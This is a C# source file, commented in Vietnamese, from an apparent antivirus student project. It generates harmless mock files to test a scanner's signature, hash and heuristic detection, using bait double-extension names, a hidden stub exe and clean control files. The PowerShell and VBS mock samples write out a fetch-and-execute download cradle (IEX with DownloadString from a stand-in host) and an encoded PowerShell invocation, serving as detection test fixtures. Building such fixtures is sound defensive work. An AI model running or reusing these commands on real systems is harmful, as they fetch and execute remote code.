/*using System;
using System.Collections.Generic;
using System.IO;

namespace ScanAndRemoveVirus.Services
{
    /// <summary>
    /// Bộ "virus mock" chính chủ: 11 tệp VÔ HẠI tái hiện đầy đủ 3 kỹ thuật phát hiện
    /// (8 đe dọa + 3 đối chứng sạch). Vị trí CHUẨN: thư mục TestSamples\ ngay tại gốc repo
    /// (repo đã gồm sẵn file; tìm từ thư mục exe đi lên). Nếu app chạy
    /// ngoài repo -> fallback tạo ở Desktop\XVirus-Samples. Create() (nút "Tạo tệp mẫu")
    /// chỉ phục hồi/ghi đè nội dung — idempotent.
    /// </summary>
    public static class TestSamples
    {
        public const string SignatureSampleName = "mau-ky-hieu.txt";            // KT1: prefix
        public const string HashSampleName = "mau-hash-sha256.txt";              // KT1: hash bảng chữ ký
        public const string EicarNameSample = "demo_eicar_named.dat";            // KT1: luật tên chứa "eicar"
        public const string SpoofSampleName = "thong-bao-hoa-don-invoice.pdf.exe"; // KT2: đuôi kép + mồi câu
        public const string ScriptSampleName = "update-flash.ps1";               // KT2: marker PowerShell độc
        // ---- Bộ mở rộng: phủ nốt các vector heuristic/chữ ký chưa có mẫu đối chứng ----
        public const string HiddenExeName = "thong-bao-crack-hidden.exe";        // KT2: exe ẩn + tên mồi câu (40+30=70)
        public const string VbsSampleName = "downloader-tien-ich.vbs";           // KT2: 3 marker script (iex+base64+download)
        public const string JsPrefixName = "hook-tien-ich.js";                   // KT1: prefix chữ ký ở byte 0 qua đuôi .js
        public const string CrackedExeName = "keygen-pro.exe";                   // đối chứng: mồi câu đơn lẻ 30/100 DƯỚI ngưỡng
        public const string CleanScriptName = "script-sach.ps1";                 // đối chứng: script lành KHÔNG được báo
        public const string BenignSampleName = "README-mau.txt";                 // đối chứng: KHÔNG được báo

        private static string cachedFolder;

        public static string FolderPath
        {
            get
            {
                if (cachedFolder != null) return cachedFolder;
                // Tìm TestSamples\ gần nhất bằng cách leo lên từ thư mục exe
                // (bin\Debug -> gốc repo TestSamples; fallback Desktop khi chạy ngoài repo)
                var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
                for (int hop = 0; hop < 7 && dir != null; hop++, dir = dir.Parent)
                {
                    string cand = Path.Combine(dir.FullName, "TestSamples");
                    if (Directory.Exists(cand)) { cachedFolder = cand; return cand; }
                }
                cachedFolder = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "XVirus-Samples");
                return cachedFolder;
            }
        }

        /// <summary>Tạo (đè nếu tồn tại) bộ mẫu; trả về danh sách đường dẫn. Idempotent.</summary>
        public static List<string> Create()
        {
            Directory.CreateDirectory(FolderPath);
            var made = new List<string>();
            made.Add(Write(SignatureSampleName,
                ScanEngine.TestSignature + "day-la-mau-gia-lap-vo-hai"));
            made.Add(Write(HashSampleName, ScanEngine.SignatureSampleContent));
            made.Add(Write(EicarNameSample, "Ten trung chuan EICAR chi de duoc phat hian theo ten."));
            made.Add(Write(SpoofSampleName, "Khong phai PE that - chi-la-mau-duoi-kep."));
            made.Add(Write(ScriptSampleName,
                "$ErrorActionPreference='SilentlyContinue';"
                + "IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/p');"
                + " $e=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQ=='));"
                + " powershell -nop -enc TQ=="));
            // KT2: exe ẩn (+40) + tên mồi câu "crack" (+30) = 70 ≥ 60 ngưỡng heuristic
            made.Add(Write(HiddenExeName, "Khong phai PE that - mau exe-an-moi-cau."));
            File.SetAttributes(Path.Combine(FolderPath, HiddenExeName), FileAttributes.Hidden);
            // KT2: script .vbs chứa 3 marker độc điển hình (iex + download + base64) = 90/100.
            // Marker so trên text đã lowercase — viết hoa thế nào cũng khớp.
            made.Add(Write(VbsSampleName,
                "' mo phong PowerShell: IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/x')\r\n"
                + "' gia ma: FromBase64String('QQ==') roi thuc thi\r\n"
                + "WScript.Echo \"mau vbs vo hai - chi la text\""));
            // KT1: chữ ký prefix phải nằm ở BYTE 0 — CheckContent chỉ soi 22 byte đầu tệp
            made.Add(Write(JsPrefixName, ScanEngine.TestSignature + "javascript-sig-mock"));
            // Đối chứng: mồi câu đơn lẻ +30 — heuristic KHÔNG được báo nhầm tên đẹp
            made.Add(Write(CrackedExeName, "Khong phai PE that - mau moi cau duoi nguong."));
            // Đối chứng: script lành thật sự (dọn file tmp), không marker nào -> không được báo
            made.Add(Write(CleanScriptName,
                "# script-sach: don dep file tam\r\n"
                + "Get-ChildItem $env:TEMP -Filter '*.log' | Remove-Item -Confirm:$false\r\n"));
            made.Add(Write(BenignSampleName,
                "Day la tep doi chung SACH: quyet ca thu muc nay chi duoc phép báo ĐÚNG 8 tep mau tren."));
            return made;
        }

        private static string Write(string name, string content)
        {
            string path = Path.Combine(FolderPath, name);
            // Windows chặn ghi đè tệp có attribute Hidden/ReadOnly -> gỡ trước,
            // mẫu cần ẩn (HiddenExeName) sẽ được đặt lại Hidden ngay sau khi ghi.
            if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Normal);
            File.WriteAllText(path, content);
            return path;
        }
    }
}
*/

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace ScanAndRemoveVirus.Services
{
    /// <summary>
    /// Bộ tệp mẫu VÔ HẠI dùng để kiểm thử ScanEngine.
    ///
    /// Bao gồm:
    /// - Mẫu chữ ký prefix.
    /// - Mẫu SHA256.
    /// - Mẫu EICAR theo tên.
    /// - Các mẫu heuristic.
    /// - Các mẫu đối chứng sạch.
    ///
    /// TestSamples KHÔNG truy cập SQL Server trực tiếp.
    ///
    /// Sau khi ScanEngine được chuyển sang VirusSignatureRepository:
    ///
    /// TestSamples
    ///      ↓
    /// ScanEngine
    ///      ↓
    /// VirusSignatureRepository
    ///      ↓
    /// dbo.VirusSignatures
    ///
    /// Riêng mẫu prefix vẫn được giữ local vì CSDL hiện tại
    /// không có cột chứa nội dung/pattern của chữ ký prefix.
    /// </summary>
    public static class TestSamples
    {
        // =========================================================
        // TÊN CÁC FILE MẪU
        // =========================================================

        /// <summary>
        /// KT1: kiểm tra chữ ký prefix ở đầu file.
        /// </summary>
        public const string SignatureSampleName =
            "mau-ky-hieu.txt";

        /// <summary>
        /// KT1: kiểm tra SHA256 với bảng chữ ký.
        /// </summary>
        public const string HashSampleName =
            "mau-hash-sha256.txt";

        /// <summary>
        /// KT1: kiểm tra luật tên chứa "eicar".
        /// </summary>
        public const string EicarNameSample =
            "demo_eicar_named.dat";

        /// <summary>
        /// KT2: đuôi kép + tên mồi câu.
        /// </summary>
        public const string SpoofSampleName =
            "thong-bao-hoa-don-invoice.pdf.exe";

        /// <summary>
        /// KT2: script PowerShell chứa marker nghi vấn.
        /// </summary>
        public const string ScriptSampleName =
            "update-flash.ps1";

        /// <summary>
        /// KT2: executable ẩn + tên mồi câu.
        /// </summary>
        public const string HiddenExeName =
            "thong-bao-crack-hidden.exe";

        /// <summary>
        /// KT2: VBS chứa nhiều marker nghi vấn.
        /// </summary>
        public const string VbsSampleName =
            "downloader-tien-ich.vbs";

        /// <summary>
        /// KT1: prefix signature trên file JS.
        /// </summary>
        public const string JsPrefixName =
            "hook-tien-ich.js";

        /// <summary>
        /// Đối chứng:
        /// tên mồi câu nhưng điểm heuristic dưới ngưỡng.
        /// </summary>
        public const string CrackedExeName =
            "keygen-pro.exe";

        /// <summary>
        /// Đối chứng script sạch.
        /// </summary>
        public const string CleanScriptName =
            "script-sach.ps1";

        /// <summary>
        /// Đối chứng file văn bản sạch.
        /// </summary>
        public const string BenignSampleName =
            "README-mau.txt";

        // =========================================================
        // CACHE FOLDER
        // =========================================================

        private static string cachedFolder;

        // =========================================================
        // FOLDER PATH
        // =========================================================

        /// <summary>
        /// Tìm thư mục TestSamples ở gần project.
        ///
        /// Khi chạy từ:
        ///
        /// bin\Debug
        /// bin\Release
        ///
        /// chương trình sẽ đi ngược lên tối đa 7 cấp
        /// để tìm thư mục TestSamples.
        ///
        /// Nếu không tìm thấy thì dùng:
        ///
        /// Desktop\XVirus-Samples
        /// </summary>
        public static string FolderPath
        {
            get
            {
                if (!string.IsNullOrEmpty(cachedFolder))
                {
                    return cachedFolder;
                }

                try
                {
                    DirectoryInfo directory =
                        new DirectoryInfo(
                            AppDomain.CurrentDomain.BaseDirectory);

                    for (int hop = 0;
                         hop < 7 && directory != null;
                         hop++)
                    {
                        string candidate =
                            Path.Combine(
                                directory.FullName,
                                "TestSamples");

                        if (Directory.Exists(candidate))
                        {
                            cachedFolder = candidate;
                            return cachedFolder;
                        }

                        directory = directory.Parent;
                    }
                }
                catch (Exception)
                {
                    // Nếu không tìm được repo thì fallback Desktop.
                }

                string desktop =
                    Environment.GetFolderPath(
                        Environment.SpecialFolder.DesktopDirectory);

                cachedFolder =
                    Path.Combine(
                        desktop,
                        "XVirus-Samples");

                return cachedFolder;
            }
        }

        // =========================================================
        // CREATE
        // =========================================================

        /// <summary>
        /// Tạo hoặc ghi đè toàn bộ bộ mẫu kiểm thử.
        ///
        /// Có thể gọi nhiều lần.
        /// </summary>
        public static List<string> Create()
        {
            Directory.CreateDirectory(FolderPath);

            var created =
                new List<string>();

            // =====================================================
            // KT1 - PREFIX SIGNATURE
            // =====================================================

            /*
             * TestSignature vẫn được giữ trong ScanEngine.
             *
             * CSDL VirusSignatures hiện tại không có cột
             * chứa pattern/prefix nên không đưa mẫu này vào SQL.
             */
            created.Add(
                Write(
                    SignatureSampleName,
                    ScanEngine.TestSignature +
                    "day-la-mau-gia-lap-vo-hai"));

            // =====================================================
            // KT1 - SHA256
            // =====================================================

            /*
             * Nội dung này có SHA256 cố định.
             *
             * Sau khi ScanEngine được kết nối hoàn toàn với
             * VirusSignatureRepository, SHA256 của nội dung này
             * phải tồn tại trong dbo.VirusSignatures để engine
             * phát hiện thông qua CSDL.
             */
            created.Add(
                Write(
                    HashSampleName,
                    ScanEngine.SignatureSampleContent));

            // =====================================================
            // KT1 - EICAR NAME RULE
            // =====================================================

            created.Add(
                Write(
                    EicarNameSample,
                    "Ten trung chuan EICAR " +
                    "chi de duoc phat hien theo ten."));

            // =====================================================
            // KT2 - DOUBLE EXTENSION
            // =====================================================

            created.Add(
                Write(
                    SpoofSampleName,
                    "Khong phai PE that - " +
                    "chi-la-mau-duoi-kep."));

            // =====================================================
            // KT2 - POWERSHELL
            // =====================================================

            created.Add(
                Write(
                    ScriptSampleName,

                    "$ErrorActionPreference=" +
                    "'SilentlyContinue';" +

                    "IEX(New-Object Net.WebClient)." +
                    "DownloadString(" +
                    "'http://example.invalid/p');" +

                    " $e=[Text.Encoding]::Unicode." +
                    "GetString(" +
                    "[Convert]::FromBase64String(" +
                    "'TQ=='));" +

                    " powershell -nop -enc TQ=="));

            // =====================================================
            // KT2 - HIDDEN EXECUTABLE
            // =====================================================

            string hiddenPath =
                Write(
                    HiddenExeName,
                    "Khong phai PE that - " +
                    "mau exe-an-moi-cau.");

            created.Add(hiddenPath);

            try
            {
                File.SetAttributes(
                    hiddenPath,
                    FileAttributes.Hidden);
            }
            catch (Exception)
            {
                /*
                 * Nếu không đặt được Hidden thì vẫn giữ file mẫu.
                 * Khi đó riêng vector Hidden có thể không đạt điểm
                 * heuristic như mong muốn.
                 */
            }

            // =====================================================
            // KT2 - VBS MARKERS
            // =====================================================

            created.Add(
                Write(
                    VbsSampleName,

                    "' mo phong PowerShell: " +
                    "IEX(New-Object Net.WebClient)." +
                    "DownloadString(" +
                    "'http://example.invalid/x')" +
                    "\r\n" +

                    "' gia ma: " +
                    "FromBase64String('QQ==') " +
                    "roi thuc thi" +
                    "\r\n" +

                    "WScript.Echo " +
                    "\"mau vbs vo hai - chi la text\""));

            // =====================================================
            // KT1 - PREFIX TRÊN JS
            // =====================================================

            /*
             * Prefix phải bắt đầu ngay tại byte 0.
             *
             * Không thêm khoảng trắng/BOM trước TestSignature.
             */
            created.Add(
                Write(
                    JsPrefixName,
                    ScanEngine.TestSignature +
                    "javascript-sig-mock"));

            // =====================================================
            // ĐỐI CHỨNG - DƯỚI NGƯỠNG HEURISTIC
            // =====================================================

            created.Add(
                Write(
                    CrackedExeName,
                    "Khong phai PE that - " +
                    "mau moi cau duoi nguong."));

            // =====================================================
            // ĐỐI CHỨNG - SCRIPT SẠCH
            // =====================================================

            created.Add(
                Write(
                    CleanScriptName,

                    "# script-sach: " +
                    "don dep file tam" +
                    "\r\n" +

                    "Get-ChildItem $env:TEMP " +
                    "-Filter '*.log' | " +
                    "Remove-Item -Confirm:$false" +
                    "\r\n"));

            // =====================================================
            // ĐỐI CHỨNG - TXT SẠCH
            // =====================================================

            created.Add(
                Write(
                    BenignSampleName,

                    "Day la tep doi chung SACH. " +
                    "Tep nay khong chua chu ky " +
                    "hoac marker nguy hiem."));

            return created;
        }

        // =========================================================
        // WRITE
        // =========================================================

        /// <summary>
        /// Ghi một file mẫu.
        ///
        /// Sử dụng UTF8 không BOM để đảm bảo chữ ký prefix
        /// nằm chính xác tại byte 0.
        /// </summary>
        private static string Write(
            string name,
            string content)
        {
            string path =
                Path.Combine(
                    FolderPath,
                    name);

            try
            {
                /*
                 * File Hidden hoặc ReadOnly có thể không
                 * ghi đè được.
                 *
                 * Vì vậy đưa về Normal trước khi ghi.
                 */
                if (File.Exists(path))
                {
                    File.SetAttributes(
                        path,
                        FileAttributes.Normal);
                }

                /*
                 * QUAN TRỌNG:
                 *
                 * UTF8Encoding(false) = UTF-8 không BOM.
                 *
                 * Điều này đảm bảo:
                 *
                 * ScanEngine.TestSignature
                 *
                 * nằm ngay tại byte 0 đối với mẫu prefix.
                 */
                File.WriteAllText(
                    path,
                    content ?? "",
                    new UTF8Encoding(false));

                return path;
            }
            catch
            {
                throw;
            }
        }
    }
}